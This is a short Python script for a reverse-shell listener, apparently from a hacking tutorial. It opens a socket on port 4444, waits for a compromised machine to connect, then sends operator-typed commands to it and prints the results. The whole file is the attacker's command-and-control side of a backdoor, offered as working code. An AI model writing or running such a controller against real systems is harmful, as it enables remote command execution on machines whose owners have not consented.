#!/usr/bin/python

import socket


class Listener:
	def __init__(self, ip, port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #pass
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #pass
		listener.bind((ip, port))
		listener.listen(0)
		print("[+] Waiting for incoming connections")
		self.connection, address = listener.accept()
		print("[+] Got a connection from " + str(address))

	def execute_remotely(self,command):
		self.connection.send(command.encode())
		return self.connection.recv(4096)

	def run(self):
		while True:
			command = input(">> ")
			result = self.execute_remotely(command) 
			print(str(result.decode('cp866')))


my_listener = Listener('', 4444)
my_listener.run()
  
  
  
  
  
